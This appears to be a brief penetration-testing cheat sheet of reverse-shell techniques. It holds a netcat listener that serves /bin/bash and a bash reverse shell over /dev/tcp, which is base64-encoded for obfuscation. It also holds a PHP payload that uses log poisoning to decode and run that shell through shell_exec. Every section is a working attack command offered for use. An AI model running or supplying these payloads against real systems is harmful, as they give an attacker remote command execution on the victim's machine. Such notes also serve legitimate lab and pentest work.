### netcat

```bash
netcat -lvnp $port -e /bin/bash
netcat $ip $port
```

### Base 64 encode the shell
```bash
echo -n 'bash -c "bash -i >& /dev/tcp/$ip/$port 0>&1"' | base64
```

### Use Log Posioning to get a reverse shell

```php
<?php echo shell_exec('echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8kaXAvJHBvcnQgMD4mMSI= | base64 -d | bash'); ?>